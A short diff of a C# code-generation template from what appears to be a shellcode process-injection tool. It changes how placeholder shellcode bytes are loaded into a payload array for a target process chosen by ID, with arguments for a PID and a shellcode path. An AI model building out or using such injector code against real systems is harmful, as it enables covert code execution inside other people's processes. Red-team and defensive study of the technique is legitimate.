@@ -4,10 +4,10 @@
     {
         public static string STATICMODE = @"
         Process proc = Process.GetProcessById( {{PROCESSID}} );
-		System.Collections.Generic.List<byte> bufList = new System.Collections.Generic.List<byte> { {{SHELLCODE}} };
-		byte[] payload = bufList.ToArray();
-        ";
-
+        System.Collections.Generic.List<byte> payloadList = new System.Collections.Generic.List<byte>();
+        {{SHELLCODE}}
+        byte[] payload = payloadList.ToArray();
+            ";
         public static string DYNAMICMODE = @"
         if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)) {
             Console.WriteLine(""-pid: Process ID of target process \n-bin: Path to shellcode"");
